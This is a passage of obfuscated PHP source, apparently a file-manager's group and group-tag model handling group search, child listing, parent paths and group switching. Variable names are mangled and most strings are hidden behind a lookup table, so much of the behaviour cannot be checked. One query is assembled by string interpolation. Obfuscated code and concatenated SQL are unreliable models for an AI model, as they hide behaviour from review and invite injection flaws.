= $this->where(array($şèóĞ»Ô[441] => $‚·…áõĞ))->_makeOrder()->selectPage(200); $this->_listDataApply($í´ûÄ‰œ[$şèóĞ»Ô[379]]); return $í´ûÄ‰œ; } public function listChildIds($Üùöç–±) { $Ö‚‰ú“â =& $_SERVER[Å¶¨Şêº]; if (is_string($ò¢ı°Ã‚)) { $Üùöç–± = explode($Ö‚‰ú“â[60], $Üùöç–±); } $Òı–Ğœ = $this->where(array($Ö‚‰ú“â[1852] => array($Ö‚‰ú“â[7], $Üùöç–±)))->field($Ö‚‰ú“â[1944])->select(); if (!$Òı–Ğœ) { return !1; } $úóœâŠ± = array(); foreach ($Òı–Ğœ as $üÁìáÊš) { $úóœâŠ±[] = "\163\x65\x6c\145\143\x74\x20\x67\162\x6f\165\160\111\104\40\146\x72\x6f\155\x20\x60\x67\x72\x6f\165\x70\x60\x20\167\x68\145\162\145\x20\160\x61\x72\x65\156\164\114\x65\166\145\x6c\x20\x6c\x69\x6b\145\40\x27{$üÁìáÊš[$Ö‚‰ú“â[520]]}{$üÁìáÊš[$Ö‚‰ú“â[1852]]}\54\45\x27"; } $úóœâŠ± = implode($Ö‚‰ú“â[1945], $úóœâŠ±); $Òı–Ğœ = $this->query($úóœâŠ±); if (!$Òı–Ğœ) { return array(); } $Üùöç–± = array_to_keyvalue($Òı–Ğœ, $Ö‚‰ú“â[12], $Ö‚‰ú“â[1852]); return array_unique($Üùöç–±); } public function listByID($¼€¼…Á…) { $²âŞÈ¶Â =& $_SERVER[Å¶¨Şêº]; if (!$¼€¼…Á…) { return array(); } $›Ş¿û = array($²âŞÈ¶Â[1852] => array($²âŞÈ¶Â[7], $¼€¼…Á…)); $‚™Í®ï = $this->where($›Ş¿û)->select(); $‚™Í®ï = array_sort_keep($‚™Í®ï, $²âŞÈ¶Â[1852], $¼€¼…Á…); $this->_listDataApply($‚™Í®ï); return $‚™Í®ï; } public function listSearch($Ä»Ÿç¹û) { $ÌÑ—Š²õ =& $_SERVER[Å¶¨Şêº]; $Ùê÷‘¦œ = $Ä»Ÿç¹û[$ÌÑ—Š²õ[1946]]; $ÚŸµú€ü = isset($Ä»Ÿç¹û[$ÌÑ—Š²õ[1947]]) ? $Ä»Ÿç¹û[$ÌÑ—Š²õ[1947]] : !1; if (!trim($Ùê÷‘¦œ)) { return !1; } $Ùê÷‘¦œ = str_replace($ÌÑ—Š²õ[1948], $ÌÑ—Š²õ[1949], $Ùê÷‘¦œ); $„»ğ‹—Ó = array($ÌÑ—Š²õ[1852] => array($ÌÑ—Š²õ[392], "{$Ùê÷‘¦œ}\45"), $ÌÑ—Š²õ[42] => array($ÌÑ—Š²õ[392], "\45{$Ùê÷‘¦œ}\45"), $ÌÑ—Š²õ[997] => $ÌÑ—Š²õ[1950]); if ($ÚŸµú€ü) { $ëİó´¨æ = $this->getInfoSimple($ÚŸµú€ü); $ØğÄËš = $ëİó´¨æ[$ÌÑ—Š²õ[520]] . $ÚŸµú€ü . $ÌÑ—Š²õ[550]; $„»ğ‹—Ó = array($„»ğ‹—Ó, array($ÌÑ—Š²õ[520] => array($ÌÑ—Š²õ[392], $ØğÄËš))); } $„»ğ‹—Ó = $this->parseWhereLike($„»ğ‹—Ó); $Ñµé€æô = $this->_makeOrder()->where($„»ğ‹—Ó)->selectPage(20); $Ñµé€æô = $Ñµé€æô ? $Ñµé€æô : array($ÌÑ—Š²õ[379] => array(), $ÌÑ—Š²õ[376] => array()); if (!$Ñµé€æô || count($Ñµé€æô[$ÌÑ—Š²õ[379]]) < 5 && Input::check($Ùê÷‘¦œ, $ÌÑ—Š²õ[328])) { $™¶’Ç± = $this->groupChildrenAll($ÚŸµú€ü); $×Ü­Ç = $this->_searchFromMeta($ÌÑ—Š²õ[473], $Ùê÷‘¦œ, 10, $™¶’Ç±); $À¸°¶§ = $this->_searchFromMeta($ÌÑ—Š²õ[474], $Ùê÷‘¦œ, 10, $™¶’Ç±); $»¥ÀŞŸî = array_merge($×Ü­Ç, $À¸°¶§, $Ñµé€æô[$ÌÑ—Š²õ[379]]); $Ñµé€æô[$ÌÑ—Š²õ[379]] = array_unique_by_key($»¥ÀŞŸî, $ÌÑ—Š²õ[1852]); $Ñµé€æô[$ÌÑ—Š²õ[376]][$ÌÑ—Š²õ[377]] = count($Ñµé€æô[$ÌÑ—Š²õ[379]]); $Ñµé€æô[$ÌÑ—Š²õ[376]][$ÌÑ—Š²õ[378]] = ceil($Ñµé€æô[$ÌÑ—Š²õ[376]][$ÌÑ—Š²õ[377]] / $Ñµé€æô[$ÌÑ—Š²õ[376]][$ÌÑ—Š²õ[373]]); } $this->_listDataApply($Ñµé€æô[$ÌÑ—Š²õ[379]]); return $Ñµé€æô; } protected function groupChildrenAll($¥Ğšëù) { $ÎÒÀ­ò =& $_SERVER[Å¶¨Şêº]; if (!$¥Ğšëù) { return !1; } if (is_string($¥Ğšëù)) { $¥Ğšëù = array($¥Ğšëù); } $«¶¢×ŠÄ = $¥Ğšëù; foreach ($¥Ğšëù as $é¶í˜íš) { $ÇèõıŸŠ = $this->getInfoSimple($é¶í˜íš); $¼¨»æĞ = array($ÎÒÀ­ò[520] => array($ÎÒÀ­ò[392], $ÇèõıŸŠ[$ÎÒÀ­ò[520]] . $é¶í˜íš . $ÎÒÀ­ò[550])); $É®¸ÁÛª = $this->field($ÎÒÀ­ò[1852])->where($¼¨»æĞ)->select(); $«¶¢×ŠÄ = array_merge($«¶¢×ŠÄ, array_to_keyvalue($É®¸ÁÛª, $ÎÒÀ­ò[12], $ÎÒÀ­ò[1852])); } return array_unique($«¶¢×ŠÄ); } private function _searchFromMeta($“ÄÚÉ§€, $Â³øœ±Ï, $èŠ—ÑŸ¡, $ç€€Š¢ø) { $ô§Ÿ›· =& $_SERVER[Å¶¨Şêº]; $Â³øœ±Ï = strtolower($Â³øœ±Ï); $¯ÕÕõ²‰ = array($ô§Ÿ›·[105] => $“ÄÚÉ§€, $ô§Ÿ›·[384] => array($ô§Ÿ›·[392], "\45{$Â³øœ±Ï}\x25")); $¯ÕÕõ²‰ = $this->parseWhereLike($¯ÕÕõ²‰); if ($ç€€Š¢ø) { $¯ÕÕõ²‰[$ô§Ÿ›·[1852]] = array($ô§Ÿ›·[7], $ç€€Š¢ø); } $ÀÜØ„ˆŸ = Model($ô§Ÿ›·[1951])->where($¯ÕÕõ²‰)->limit($èŠ—ÑŸ¡)->select(); if (!$ÀÜØ„ˆŸ) { return array(); } $ÀÜØ„ˆŸ = array_to_keyvalue($ÀÜØ„ˆŸ, $ô§Ÿ›·[12], $ô§Ÿ›·[1852]); $ï§î¤ù = $this->where(array($ô§Ÿ›·[1940] => array($ô§Ÿ›·[7], $ÀÜØ„ˆŸ)))->select(); if (!$ï§î¤ù) { return array(); } return $ï§î¤ù; } protected function _listDataApplyItem($Ã«¢òÊÜ) { $‚óº“£û = array($Ã«¢òÊÜ); $this->_listDataApply($‚óº“£û); return $‚óº“£û[0]; } protected function _listDataApply(&$¶è›Ì”Å) { $ÉÔäìåë =& $_SERVER[Å¶¨Şêº]; if (!$¶è›Ì”Å) { return; } $ÄŠØÂ¢ñ = array_to_keyvalue($¶è›Ì”Å, $ÉÔäìåë[12], $ÉÔäìåë[1852]); $this->_listAppendChildren($¶è›Ì”Å); $this->_listAppendChildrenMember($¶è›Ì”Å); $this->_listAppendMeta($¶è›Ì”Å, $ÄŠØÂ¢ñ); $this->_listAppendParent($¶è›Ì”Å); $this->_listAppendSourceRoot($¶è›Ì”Å, $ÄŠØÂ¢ñ); } private function _listAppendChildren(&$ñïù’Ñ») { $š¸õ†ÎÔ =& $_SERVER[Å¶¨Şêº]; $š¼ïŸ÷ = array_to_keyvalue($ñïù’Ñ», $š¸õ†ÎÔ[12], $š¸õ†ÎÔ[1852]); $–Ò©¼ = array($š¸õ†ÎÔ[441] => array($š¸õ†ÎÔ[7], $š¼ïŸ÷)); $±şóÉ = array($š¸õ†ÎÔ[441], $š¸õ†ÎÔ[1952] => $š¸õ†ÎÔ[500]); $´Æ¦ö‚Ê = $this->field($±şóÉ)->where($–Ò©¼)->group($š¸õ†ÎÔ[441])->select(); $Æ‰§Ò  = array_to_keyvalue($´Æ¦ö‚Ê, $š¸õ†ÎÔ[441], $š¸õ†ÎÔ[500]); foreach ($ñïù’Ñ» as &$¿”òã«) { $î¼É·Ï¾ = $¿”òã«[$š¸õ†ÎÔ[1852]]; $¿”òã«[$š¸õ†ÎÔ[1953]] = isset($Æ‰§Ò [$î¼É·Ï¾]) ? intval($Æ‰§Ò [$î¼É·Ï¾]) : !1; } unset($¿”òã«); } private function _listAppendChildrenMember(&$ŠÁÊ÷ß‡) { $é†–ÈÀÖ =& $_SERVER[Å¶¨Şêº]; $€Ë±Ú„í = array_to_keyvalue($ŠÁÊ÷ß‡, $é†–ÈÀÖ[12], $é†–ÈÀÖ[1852]); $‘ØƒÃ = array($é†–ÈÀÖ[1852] => array($é†–ÈÀÖ[7], $€Ë±Ú„í)); $ªÏ–¹”… = array($é†–ÈÀÖ[1852], $é†–ÈÀÖ[1952] => $é†–ÈÀÖ[500]); $¢ÁíÛˆĞ = Model($é†–ÈÀÖ[1942])->field($ªÏ–¹”…)->where($‘ØƒÃ)->group($é†–ÈÀÖ[1852])->select(); $‹‰ú÷ÚÙ = array_to_keyvalue($¢ÁíÛˆĞ, $é†–ÈÀÖ[1852], $é†–ÈÀÖ[500]); foreach ($ŠÁÊ÷ß‡ as &$×äç™—¥) { $Î­¯œâ£ = $×äç™—¥[$é†–ÈÀÖ[1852]]; $×äç™—¥[$é†–ÈÀÖ[1954]] = isset($‹‰ú÷ÚÙ[$Î­¯œâ£]) ? intval($‹‰ú÷ÚÙ[$Î­¯œâ£]) : !1; } unset($×äç™—¥); } private function _listAppendMeta(&$Ë¤æş“, $›•½ÔÑœ) { $ÊÌ³ŸÛÙ =& $_SERVER[Å¶¨Şêº]; $Óƒ‹”ıÆ = array($ÊÌ³ŸÛÙ[1852] => array($ÊÌ³ŸÛÙ[7], $›•½ÔÑœ)); $¢—ë¼•Š = Model($ÊÌ³ŸÛÙ[1941])->where($Óƒ‹”ıÆ)->select(); $¢—ë¼•Š = array_to_keyvalue_group($¢—ë¼•Š, $ÊÌ³ŸÛÙ[1852]); foreach ($¢—ë¼•Š as &$šİÍÙç”) { $šİÍÙç” = array_to_keyvalue($šİÍÙç”, $ÊÌ³ŸÛÙ[105], $ÊÌ³ŸÛÙ[384]); } unset($šİÍÙç”); foreach ($Ë¤æş“ as &$¢¹µˆ”£) { $¢¹µˆ”£[$ÊÌ³ŸÛÙ[475]] = array(); if (isset($¢—ë¼•Š[$¢¹µˆ”£[$ÊÌ³ŸÛÙ[1852]]])) { $¢¹µˆ”£[$ÊÌ³ŸÛÙ[475]] = $¢—ë¼•Š[$¢¹µˆ”£[$ÊÌ³ŸÛÙ[1852]]]; } } unset($¢¹µˆ”£); } protected function parentLevelArray($ûÀÓ”…) { $œèÜÜˆø =& $_SERVER[Å¶¨Şêº]; $ûÀÓ”… = explode($œèÜÜˆø[60], trim($ûÀÓ”…, $œèÜÜˆø[60])); $ûÀÓ”… = array_remove_value($ûÀÓ”…, $œèÜÜˆø[209]); return $ûÀÓ”…; } protected function parentInGroup($êœòÊØ, $Å²ûÌ“) { $ÖÔˆÆÓ =& $_SERVER[Å¶¨Şêº]; $Å¦íÚõ = $this->getInfoSimple($êœòÊØ); if (!$Å¦íÚõ) { return !0; } $€œñßŠ… = $this->parentLevelArray($Å¦íÚõ[$ÖÔˆÆÓ[520]]); $€œñßŠ…[] = $êœòÊØ; foreach ($€œñßŠ… as $êœòÊØ) { if (in_array($êœòÊØ . $ÖÔˆÆÓ[12], $Å²ûÌ“)) { return !0; } } return !1; } private function _listAppendParent(&$½•É–å) { $µº’£øï =& $_SERVER[Å¶¨Şêº]; $­Ä‚„Ğã = array(); foreach ($½•É–å as &$’ÖÔ Ç¾) { $­Ä‚„Ğã[$’ÖÔ Ç¾[$µº’£øï[1852]]] = $’ÖÔ Ç¾[$µº’£øï[42]]; $²ñµÜÉ = $this->parentLevelArray($’ÖÔ Ç¾[$µº’£øï[520]]); foreach ($²ñµÜÉ as $Ú ´ƒùÒ) { if (!isset($­Ä‚„Ğã[$Ú ´ƒùÒ])) { $­Ä‚„Ğã[$Ú ´ƒùÒ] = 0; } } } unset($’ÖÔ Ç¾); foreach ($­Ä‚„Ğã as $Úëİ„¸Ñ => $õí‚ëÂÉ) { if ($õí‚ëÂÉ) { continue; } $òÖˆ†±£ = $this->getInfoSimple($Úëİ„¸Ñ); $­Ä‚„Ğã[$Úëİ„¸Ñ] = $òÖˆ†±£[$µº’£øï[42]]; } $½¨ô £à = $GLOBALS[$µº’£øï[6]][$µº’£øï[100]][$µº’£øï[1955]]; if ($GLOBALS[$µº’£øï[503]] == $µº’£øï[99]) { $½¨ô £à = !1; } foreach ($½•É–å as &$’ÖÔ Ç¾) { $²ñµÜÉ = $this->parentLevelArray($’ÖÔ Ç¾[$µº’£øï[520]]); $Æº¢ŒØğ = $µº’£øï[12]; foreach ($²ñµÜÉ as $Úëİ„¸Ñ => $Ú ´ƒùÒ) { if ($½¨ô £à && $Úëİ„¸Ñ == 0) { continue; } $Æº¢ŒØğ .= $­Ä‚„Ğã[$Ú ´ƒùÒ] . $µº’£øï[8]; } if ($²ñµÜÉ) { $Æº¢ŒØğ .= $’ÖÔ Ç¾[$µº’£øï[42]]; } $’ÖÔ Ç¾[$µº’£øï[525]] = str_replace($µº’£øï[528], $µº’£øï[8], $Æº¢ŒØğ); } unset($’ÖÔ Ç¾); } private function _listAppendSourceRoot(&$ŠíÊÑ½´, $ÒÙÀ¥™Â) { $Ëˆæ‹à½ =& $_SERVER[Å¶¨Şêº]; $¸È´ÉïÒ = Model($Ëˆæ‹à½[823])->listSourceRoot(SourceModel::TYPE_GROUP, $ÒÙÀ¥™Â); $¸È´ÉïÒ = array_to_keyvalue($¸È´ÉïÒ, $Ëˆæ‹à½[505]); $¸È´ÉïÒ = array_remove_key($¸È´ÉïÒ, $Ëˆæ‹à½[505]); foreach ($ŠíÊÑ½´ as &$¬ú’«†”) { $¬ú’«†”[$Ëˆæ‹à½[98]] = $¸È´ÉïÒ[$¬ú’«†”[$Ëˆæ‹à½[1852]]] ? $¸È´ÉïÒ[$¬ú’«†”[$Ëˆæ‹à½[1852]]] : array(); } unset($¬ú’«†”); } protected function groupMerge($Óœ˜†¤) { $Óœ˜†¤ = array_values(array_unique($Óœ˜†¤)); $±Ê²²‹³ = array(); for ($ãˆƒÓ½œ = 0; $ãˆƒÓ½œ < count($Óœ˜†¤); $ãˆƒÓ½œ++) { $ÑÅÎ¬‰ó = !1; for ($æ™ıúİ = 0; $æ™ıúİ < count($Óœ˜†¤); $æ™ıúİ++) { if ($ãˆƒÓ½œ == $æ™ıúİ) { continue; } if ($this->isParentOf($Óœ˜†¤[$æ™ıúİ], $Óœ˜†¤[$ãˆƒÓ½œ])) { $ÑÅÎ¬‰ó = !0; break; } } if (!$ÑÅÎ¬‰ó) { $±Ê²²‹³[] = $Óœ˜†¤[$ãˆƒÓ½œ]; } } return $±Ê²²‹³; } protected function isParentOf($ÑŠÒò±, $Üá§Öøİ) { $àü½ü¿È =& $_SERVER[Å¶¨Şêº]; if (!$ÑŠÒò± || !$Üá§Öøİ || $ÑŠÒò± == $Üá§Öøİ) { return !1; } $ªóå“¹¯ = $this->getInfoSimple($ÑŠÒò±); $ªìÙ¹±“ = $this->getInfoSimple($Üá§Öøİ); $ÄßîñÛí = $ªóå“¹¯[$àü½ü¿È[520]] . $ÑŠÒò± . $àü½ü¿È[60]; if (substr($ªìÙ¹±“[$àü½ü¿È[520]], 0, strlen($ÄßîñÛí)) == $ÄßîñÛí) { return !0; } return !1; } public function groupShowRoot($êÛœ¸ø, $ó¦Õ¥á¤ = false) { $™·ê¥€† =& $_SERVER[Å¶¨Şêº]; $½«ú©Ÿ£ = $this->getInfo($êÛœ¸ø); if (!$½«ú©Ÿ£) { return array(); } $ı¼‹ˆ¾« = $this->parentLevelArray($½«ú©Ÿ£[$™·ê¥€†[520]]); $úÇ©±ÊÒ = array($êÛœ¸ø); if (count($ı¼‹ˆ¾«) == 0) { return $úÇ©±ÊÒ; } if ($ó¦Õ¥á¤ && count($ı¼‹ˆ¾«) == 1) { return $úÇ©±ÊÒ; } if (!$½«ú©Ÿ£[$™·ê¥€†[475]] || !isset($½«ú©Ÿ£[$™·ê¥€†[475]][$™·ê¥€†[1938]]) || $½«ú©Ÿ£[$™·ê¥€†[475]][$™·ê¥€†[1938]] == $™·ê¥€†[1907]) { return $this->groupShowRoot($ı¼‹ˆ¾«[count($ı¼‹ˆ¾«) - 1], $ó¦Õ¥á¤); } if ($½«ú©Ÿ£[$™·ê¥€†[475]][$™·ê¥€†[1938]] == $™·ê¥€†[367]) { $ùšÙâÜ‚ = explode($™·ê¥€†[60], $½«ú©Ÿ£[$™·ê¥€†[475]][$™·ê¥€†[1939]]); if ($ùšÙâÜ‚) { $úÇ©±ÊÒ = array_merge($úÇ©±ÊÒ, $ùšÙâÜ‚); } } return $úÇ©±ÊÒ; } protected function resetParentLevel() { $Óöö³è† =& $_SERVER[Å¶¨Şêº]; $Ñ¥é¢ÀÁ = $Óöö³è†[1852]; $’â£‡„½ = $this->select(); $’â£‡„½ = array_to_keyvalue($’â£‡„½, $Ñ¥é¢ÀÁ); foreach ($’â£‡„½ as $¾ğŞ×áæ) { $ĞüÒíÜá = $¾ğŞ×áæ; $åíùşÆä = array(); while ($ĞüÒíÜá[$Óöö³è†[441]] != 0) { $åíùşÆä[] = $ĞüÒíÜá[$Óöö³è†[441]]; $ĞüÒíÜá = $’â£‡„½[$ĞüÒíÜá[$Óöö³è†[441]]]; } $åíùşÆä[] = 0; $åíùşÆä = $Óöö³è†[60] . implode($Óöö³è†[60], array_reverse($åíùşÆä)) . $Óöö³è†[60]; $this->setNamePinyin($¾ğŞ×áæ[$Ñ¥é¢ÀÁ], $¾ğŞ×áæ[$Óöö³è†[42]]); $this->where(array($Ñ¥é¢ÀÁ => $¾ğŞ×áæ[$Ñ¥é¢ÀÁ]))->save(array($Óöö³è†[589] => $åíùşÆä)); } return $’â£‡„½; } public function groupNameAuto($¢·È„À, $™³Ùâ´Ì) { $€¶¤’³ =& $_SERVER[Å¶¨Şêº]; $õºÏîŠ = $this->where(array($€¶¤’³[410] => $¢·È„À))->getField($€¶¤’³[42], !0); if (!$õºÏîŠ || !in_array($™³Ùâ´Ì, $õºÏîŠ)) { return $™³Ùâ´Ì; } for ($¦Çôœ×½ = 1; $¦Çôœ×½ <= count($õºÏîŠ) + 1; $¦Çôœ×½++) { $áé†´ì£ = $™³Ùâ´Ì . "\50{$¦Çôœ×½}\x29"; if (!in_array($áé†´ì£, $õºÏîŠ)) { return $áé†´ì£; } } } public function groupSwitch($“Ûé›®—, $›–õ—¢ö) { $œ¨¥ÉÀ‚ =& $_SERVER[Å¶¨Şêº]; $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[1852] => array($œ¨¥ÉÀ‚[7], array($“Ûé›®—, $›–õ—¢ö))); $Û‡˜ìà­ = $this->where($ö¤¾Ú¾Õ)->select(); $Û‡˜ìà­ = array_to_keyvalue($Û‡˜ìà­, $œ¨¥ÉÀ‚[1852]); if (!isset($Û‡˜ìà­[$“Ûé›®—]) || !isset($Û‡˜ìà­[$›–õ—¢ö]) || $Û‡˜ìà­[$“Ûé›®—][$œ¨¥ÉÀ‚[441]] == 0) { return !1; } $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[1852] => $“Ûé›®—); $şĞòÅÓÂ = Model($œ¨¥ÉÀ‚[1942])->where($ö¤¾Ú¾Õ)->select(); if (!$şĞòÅÓÂ) { $şĞòÅÓÂ = array(); } foreach ($şĞòÅÓÂ as $§ Ù´µ’) { $½Á‚ºÆÕ = $§ Ù´µ’[$œ¨¥ÉÀ‚[1663]]; $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[1663] => $½Á‚ºÆÕ, $œ¨¥ÉÀ‚[1852] => $›–õ—¢ö); $´ÈÕÕº¹ = Model($œ¨¥ÉÀ‚[1942])->where($ö¤¾Ú¾Õ)->find(); if (!$´ÈÕÕº¹) { $şÌÏï = array($›–õ—¢ö => $§ Ù´µ’[$œ¨¥ÉÀ‚[1956]]); Model($œ¨¥ÉÀ‚[534])->userGroupAdd($½Á‚ºÆÕ, $şÌÏï); } Model($œ¨¥ÉÀ‚[534])->userGroupRemove($½Á‚ºÆÕ, $“Ûé›®—); } $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[420] => 2, $œ¨¥ÉÀ‚[441] => 0, $œ¨¥ÉÀ‚[419] => 1, $œ¨¥ÉÀ‚[505] => array($œ¨¥ÉÀ‚[7], array($“Ûé›®—, $›–õ—¢ö))); $‡òºÛâî = Model($œ¨¥ÉÀ‚[823])->where($ö¤¾Ú¾Õ)->field($œ¨¥ÉÀ‚[1957])->select(); $‡òºÛâî = array_to_keyvalue($‡òºÛâî, $œ¨¥ÉÀ‚[505], $œ¨¥ÉÀ‚[411]); $®Åİ½îÇ = !empty($‡òºÛâî[$“Ûé›®—]) ? $‡òºÛâî[$“Ûé›®—] : !1; if ($®Åİ½îÇ) { if (!$‡òºÛâî[$›–õ—¢ö]) { $‡òºÛâî[$›–õ—¢ö] = Model($œ¨¥ÉÀ‚[823])->groupRootAdd($›–õ—¢ö); } $Ö›¢±£ = $‡òºÛâî[$›–õ—¢ö]; $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[441] => $®Åİ½îÇ); $‡òºÛâî = Model($œ¨¥ÉÀ‚[823])->where($ö¤¾Ú¾Õ)->field($œ¨¥ÉÀ‚[1958])->select(); if (!$‡òºÛâî) { $‡òºÛâî = array(); } Model($œ¨¥ÉÀ‚[823])->moveClearAuth = !1; foreach ($‡òºÛâî as $ÚÈäƒ§ˆ) { $Í™óãÖã = $ÚÈäƒ§ˆ[$œ¨¥ÉÀ‚[419]] == $œ¨¥ÉÀ‚[99] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($œ¨¥ÉÀ‚[823])->move($ÚÈäƒ§ˆ[$œ¨¥ÉÀ‚[411]], $Ö›¢±£, $Í™óãÖã); } Model($œ¨¥ÉÀ‚[823])->moveClearAuth = !0; $ö¤¾Ú¾Õ = array($œ¨¥ÉÀ‚[420] => 2, $œ¨¥ÉÀ‚[505] => $“Ûé›®—); $Èüñ‡ïÎ = array($œ¨¥ÉÀ‚[505] => $›–õ—¢ö); Model($œ¨¥ÉÀ‚[1959])->where($ö¤¾Ú¾Õ)->save($Èüñ‡ïÎ); Model($œ¨¥ÉÀ‚[1960])->where($ö¤¾Ú¾Õ)->save($Èüñ‡ïÎ); } $this->_changeChildLevel($Û‡˜ìà­[$“Ûé›®—], $Û‡˜ìà­[$›–õ—¢ö], !0); $this->where(array($œ¨¥ÉÀ‚[441] => $“Ûé›®—))->save(array($œ¨¥ÉÀ‚[441] => $›–õ—¢ö)); $this->_clearChildrenCache($Û‡˜ìà­[$›–õ—¢ö]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($„ÌıÌêƒ) { $è¢öî =& $_SERVER[Å¶¨Şêº]; return array($è¢öî[1961] => array($„ÌıÌêƒ[0], $è¢öî[1962]), $è¢öî[1963] => array($„ÌıÌêƒ[0], $è¢öî[1964])); } protected function get($²ƒÅä™) { $‘˜ìŠÅ— =& $_SERVER[Å¶¨Şêº]; $˜¹Ÿ¦£ = Model($‘˜ìŠÅ—[521])->metaGet($²ƒÅä™, $‘˜ìŠÅ—[1965]); $ôı¹ÅÛ– = json_decode($˜¹Ÿ¦£, !0); return $ôı¹ÅÛ– ? $ôı¹ÅÛ– : array($‘˜ìŠÅ—[1966] => $‘˜ìŠÅ—[99], $‘˜ìŠÅ—[379] => array()); } protected function set($‹•Ôú Ë, $Ã†Êşà´) { $µ……Í¾ =& $_SERVER[Å¶¨Şêº]; $Ã†Êşà´ = $Ã†Êşà´ ? $Ã†Êşà´ : array($µ……Í¾[1966] => $µ……Í¾[99], $µ……Í¾[379] => array()); return Model($µ……Í¾[521])->metaSet($‹•Ôú Ë, $µ……Í¾[1965], json_encode($Ã†Êşà´)); } protected function getByTagID($ù—˜ù•Ş, $…ÎµÙ…Ø) { $…ú…ÁÆ• =& $_SERVER[Å¶¨Şêº]; if (!$ù—˜ù•Ş || !$…ÎµÙ…Ø) { return !1; } if (!Model($…ú…ÁÆ•[521])->getInfoSimple($ù—˜ù•Ş)) { return !1; } $»º‘ö¤— = $this->get($ù—˜ù•Ş); if (!$»º‘ö¤— || !isset($»º‘ö¤—[$…ú…ÁÆ•[379]])) { return !1; } $À¿ù¦Š£ = array_find_by_field($»º‘ö¤—[$…ú…ÁÆ•[379]], $…ú…ÁÆ•[408], $…ÎµÙ…Ø); return is_array($À¿ù¦Š£) ? $À¿ù¦Š£ : !1; } public function listSource($æ›Î¯Ë, $ÚŠÀ¦¸) { $éøÖ Çä =& $_SERVER[Å¶¨Şêº]; if ($ÚŠÀ¦¸ && !is_array($ÚŠÀ¦¸)) { $ÚŠÀ¦¸ = array($ÚŠÀ¦¸); } $ç©¾ïö´ = $this->listData($æ›Î¯Ë); $óÕßšÉ = array(); foreach ($ç©¾ïö´ as $®·ı‡‚) { $èË…ƒ°¾ = $®·ı‡‚[$éøÖ Çä[95]]; if (!$èË…ƒ°¾) { continue; } if (!isset($óÕßšÉ[$èË…ƒ°¾])) { $óÕßšÉ[$èË…ƒ°¾] = array(); } $óÕßšÉ[$èË…ƒ°¾][] = $®·ı‡‚[$éøÖ Çä[435]]; } $Û¸½‰¢ = array(); foreach ($óÕßšÉ as $…ƒ«À“ => $ıÏì—Œß) { $è³³«´Æ = !0; if (!$ÚŠÀ¦¸) { $Û¸½‰¢[] = $…ƒ«À“; continue; } foreach ($ÚŠÀ¦¸ as $÷ı ¥Åú) { if (!in_array($÷ı ¥Åú, $ıÏì—Œß)) { $è³³«´Æ = !1; break; } } if ($è³³«´Æ) { $Û¸½‰¢[] = $…ƒ«À“; } } if (!$Û¸½‰¢) { return array(); } $ìÏÔ¼é = array($éøÖ Çä[426] => array($éøÖ Çä[427], $Û¸½‰¢), $éøÖ Çä[505] => $æ›Î¯Ë, $éøÖ Çä[420] => SourceModel::TYPE_GROUP); $¥€ëãÆ² = Model($éøÖ Çä[1337])->listSource($ìÏÔ¼é); if (!$¥€ëãÆ² || count($Û¸½‰¢) == $¥€ëãÆ²[$éøÖ Çä[376]][$éøÖ Çä[377]]) { return $¥€ëãÆ²; } $–›Íöü› = array(); $×ÓÑÍŸ§ = array_to_keyvalue($¥€ëãÆ²[$éøÖ Çä[93]], $éøÖ Çä[12], $éøÖ Çä[411]); $¥‡Ü±„„ = array_to_keyvalue($¥€ëãÆ²[$éøÖ Çä[94]], $éøÖ Çä[12], $éøÖ Çä[411]); $ÙıÁÙŸ = array_merge($¥‡Ü±„„, $×ÓÑÍŸ§); foreach ($Û¸½‰¢ as $èË…ƒ°¾) { if (!in_array($èË…ƒ°¾, $ÙıÁÙŸ)) { $–›Íöü›[] = $èË…ƒ°¾; } } if ($–›Íöü›) { $this->removeBySource($æ›Î¯Ë, $–›Íöü›); } return $¥€ëãÆ²; } protected function listData($šóŒüßì) { $¸ş¢¾‘™ =& $_SERVER[Å¶¨Şêº]; $šÛÔ­ıÅ = array($¸ş¢¾‘™[1654] => 0, $¸ş¢¾‘™[492] => array($¸ş¢¾‘™[1967], 0), $¸ş¢¾‘™[431] => $¸ş¢¾‘™[1968] . $šóŒüßì); $Ç™±‚ÜĞ = $¸ş¢¾‘™[1969]; $Å…Ä‡™Æ = $this->field($Ç™±‚ÜĞ)->where($šÛÔ­ıÅ)->order($¸ş¢¾‘™[1970])->select(); return $Å…Ä‡™Æ ? $Å…Ä‡™Æ : array(); } protected function addToTag($š½Ÿƒı², $×ÄıŞÄ‚, $™¬¼³ˆ²) { $ÎŠÕ‚‰ë =& $_SERVER[Å¶¨Şêº]; if (!$this->getByTagID($š½Ÿƒı², $™¬¼³ˆ²) || !$×ÄıŞÄ‚) { return !1; } if (!Model($ÎŠÕ‚‰ë[823])->pathInfo($×ÄıŞÄ‚)) { return !1; } $€ÒŞ¿Ğı = array($ÎŠÕ‚‰ë[1654] => 0, $ÎŠÕ‚‰ë[492] => $™¬¼³ˆ², $ÎŠÕ‚‰ë[430] => $×ÄıŞÄ‚, $ÎŠÕ‚‰ë[431] => $ÎŠÕ‚‰ë[1971] . $š½Ÿƒı², $ÎŠÕ‚‰ë[429] => $ÎŠÕ‚‰ë[12], $ÎŠÕ‚‰ë[1856] => 0); if ($this->where($€ÒŞ¿Ğı)->find()) { return !1; } return $this->add($€ÒŞ¿Ğı); } protected function removeFromTag($‚‘ø£Ãñ, $¼ïıÖÒ¶, $ÄÏˆ­Ê) { $¤‰÷‹êÄ =& $_SERVER[Å¶¨Şêº]; if (!$this->getByTagID($‚‘ø£Ãñ, $ÄÏˆ­Ê) || !$¼ïıÖÒ¶) { return !1; } if (is_array($¼ïıÖÒ¶)) { $¼ïıÖÒ¶ = array($¤‰÷‹êÄ[7], $¼ïıÖÒ¶); } $ëß¼Ãç = array($¤‰÷‹êÄ[1654] => 0, $¤‰÷‹êÄ[492] => $ÄÏˆ­Ê, $¤‰÷‹êÄ[431] => $¤‰÷‹êÄ[1971] . $‚‘ø£Ãñ, $¤‰÷‹êÄ[430] => $¼ïıÖÒ¶); return $this->where($ëß¼Ãç)->delete(); } protected function removeByTag($úÛ¼ş½, $º³ÁäÅ) { $”·®Öí =& $_SERVER[Å¶¨Şêº]; if 